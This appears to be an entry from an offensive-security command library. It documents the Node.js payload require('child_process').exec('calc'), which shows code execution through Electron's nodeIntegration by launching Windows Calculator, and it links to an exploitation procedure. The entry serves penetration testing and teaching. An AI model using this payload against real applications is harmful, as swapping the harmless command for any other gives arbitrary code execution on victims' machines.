---
data: require('child_process').exec('calc')
tags:
  - javascript
  - rce
type: command
executor: javascript
platforms:
  - Windows
id: b0cbbd84-35f6-4928-9fcb-25e5ba550f95
created_at: '2025-12-11T03:47:56.454Z'
updated_at: '2025-12-11T03:47:56.454Z'
verified: false
validated: true
submitted: true
---
# require-child-process-exec-calc

## Command

```javascript
require('child_process').exec('calc')
```

## Description

JavaScript code using Node.js to spawn a new process and execute the Windows Calculator, demonstrating RCE via nodeIntegration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `exec` | Executes the command in a shell | Yes |
| `'calc'` | Command to run calc.exe | Yes |

## Examples

### Basic Usage

```javascript
require('child_process').exec('calc')
```

## Expected Output

Windows Calculator application launches.

## Related

- [[procedures/Exploit-NodeIntegration-for-Code-Execution]]
